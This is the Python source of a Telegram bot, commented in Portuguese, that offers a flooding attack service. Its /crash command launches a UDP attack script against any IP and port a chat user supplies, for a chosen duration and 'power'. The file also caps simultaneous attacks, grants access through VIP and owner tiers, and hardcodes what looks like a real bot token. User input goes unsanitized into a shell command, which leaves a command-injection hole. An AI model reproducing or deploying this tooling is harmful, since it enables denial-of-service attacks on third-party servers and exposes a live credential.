import os
import subprocess
import telebot
from threading import Thread

# Token e ID do dono
API_TOKEN = '7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8'
OWNER_ID = 6430703027

# Inicialização do bot
bot = telebot.TeleBot(API_TOKEN)

# Listas de usuários
authorized_users = [OWNER_ID]
vip_users = []
vip_commands = []
processes = []  # Lista para armazenar processos ativos
MAX_ATTACKS = 3  # Limite de ataques simultâneos

# Função para gerenciar o limite de ataques simultâneos
def manage_attacks():
    if len(processes) >= MAX_ATTACKS:
        # Mata o processo mais antigo
        oldest_process = processes.pop(0)
        if oldest_process.poll() is None:  # Verifica se o processo ainda está ativo
            oldest_process.terminate()

# Comando /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "Bem-vindo ao bot!\n\n"
        "Comandos disponíveis:\n"
        "/crash <IP:PORT> <duração> <potência> - Envia um ataque ao IP especificado.\n"
        "/meuid - Mostra seu ID de usuário.\n\n"
        "Comandos para VIPs e dono:\n"
        "/adduser <ID> - Adiciona um usuário autorizado.\n"
        "/removeuser <ID> - Remove um usuário autorizado.\n"
        "/promovervip <ID> - Promove um usuário a VIP.\n"
        "/rebaixarvip <ID> - Remove a status de VIP de um usuário.\n\n"
        "Comandos exclusivos do dono:\n"
        "/addcomandovip <comando> - Restringe o comando para VIPs.\n"
        "/revcomandovip <comando> - Remove a restrição de comando VIP."
    )
    bot.send_message(message.chat.id, welcome_text)

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if '/crash' in vip_commands and not (message.from_user.id in vip_users or message.from_user.id == OWNER_ID):
        bot.send_message(message.chat.id, "Apenas VIPs podem usar este comando.")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 4:
            bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORT> <duração> <potência>")
            return

        ip_port = command_parts[1]
        duration = command_parts[2]
        power = command_parts[3]

        if ':' not in ip_port:
            bot.send_message(message.chat.id, "Formato inválido de IP e porta. Use o formato: IP:PORT")
            return

        # Gerencia o limite de ataques simultâneos
        manage_attacks()

        # Monta o comando e executa no terminal
        command = f"python start.py UDP {ip_port} {duration} {power}"
        process = subprocess.Popen(command, shell=True)
        processes.append(process)

        bot.send_message(
            message.chat.id,
            f"Ataque enviado para {ip_port} por {duration} segundos com potência {power}!"
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"Ocorreu um erro: {str(e)}")

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def send_user_id(message):
    bot.send_message(message.chat.id, f"Seu ID de usuário é: {message.from_user.id}")

# Comandos de administração (mesmos do código anterior)
@bot.message_handler(commands=['adduser', 'removeuser', 'promovervip', 'rebaixarvip', 'addcomandovip', 'revcomandovip'])
def admin_commands(message):
    if message.from_user.id != OWNER_ID:
        bot.send_message(message.chat.id, "Você não tem permissão para usar este comando.")
        return

    command = message.text.split()
    if len(command) < 2:
        bot.send_message(message.chat.id, "Uso incorreto. Abaixo estão os comandos válidos:\n"
                                          "/adduser <ID> - Adiciona um usuário autorizado.\n"
                                          "/removeuser <ID> - Remove um usuário autorizado.\n"
                                          "/promovervip <ID> - Promove um usuário a VIP.\n"
                                          "/rebaixarvip <ID> - Remove a status de VIP de um usuário.\n"
                                          "/addcomandovip <comando> - Restringe um comando para VIPs.\n"
                                          "/revcomandovip <comando> - Remove a restrição de comando VIP.")
        return

    user_id = int(command[1])

    if command[0] == '/adduser':
        if user_id not in authorized_users:
            authorized_users.append(user_id)
            bot.send_message(message.chat.id, f"Usuário {user_id} adicionado como autorizado.")
        else:
            bot.send_message(message.chat.id, f"Usuário {user_id} já está na lista de autorizados.")

    elif command[0] == '/removeuser':
        if user_id in authorized_users:
            authorized_users.remove(user_id)
            bot.send_message(message.chat.id, f"Usuário {user_id} removido da lista de autorizados.")
        else:
            bot.send_message(message.chat.id, f"Usuário {user_id} não está na lista de autorizados.")

    elif command[0] == '/promovervip':
        if user_id not in vip_users:
            vip_users.append(user_id)
            bot.send_message(message.chat.id, f"Usuário {user_id} promovido a VIP.")
        else:
            bot.send_message(message.chat.id, f"Usuário {user_id} já é VIP.")

    elif command[0] == '/rebaixarvip':
        if user_id in vip_users:
            vip_users.remove(user_id)
            bot.send_message(message.chat.id, f"Usuário {user_id} rebaixado de VIP.")
        else:
            bot.send_message(message.chat.id, f"Usuário {user_id} não é VIP.")

    elif command[0] == '/addcomandovip':
        if len(command) > 2:
            vip_command = command[2]
            if vip_command not in vip_commands:
                vip_commands.append(vip_command)
                bot.send_message(message.chat.id, f"Comando {vip_command} restrito a VIPs.")
            else:
                bot.send_message(message.chat.id, f"Comando {vip_command} já está restrito a VIPs.")
        else:
            bot.send_message(message.chat.id, "Uso correto: /addcomandovip <comando>")

    elif command[0] == '/revcomandovip':
        if len(command) > 2:
            vip_command = command[2]
            if vip_command in vip_commands:
                vip_commands.remove(vip_command)
                bot.send_message(message.chat.id, f"Comando {vip_command} removido da lista de restritos a VIPs.")
            else:
                bot.send_message(message.chat.id, f"Comando {vip_command} não está na lista de comandos restritos.")
        else:
            bot.send_message(message.chat.id, "Uso correto: /revcomandovip <comando>")

# Inicia o bot
bot.polling()